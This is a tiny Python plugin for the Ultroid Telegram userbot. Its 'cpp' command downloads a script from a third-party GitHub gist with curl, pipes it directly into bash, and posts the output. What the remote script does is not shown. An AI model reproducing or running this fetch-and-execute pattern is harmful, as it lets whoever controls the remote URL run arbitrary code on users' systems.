from . import ultroid_cmd, get_string, bash

@ultroid_cmd(pattern="cpp",manager=True)
async def cht(e):
  await e.eor(get_string("com_1"))
  a,b = await bash(f"curl -L https://gist.githubusercontent.com/rooted-cyber/1bd2b7d3eb4d66ab06ab5e83098395e3/raw/cpp | bash")
  await e.reply(a)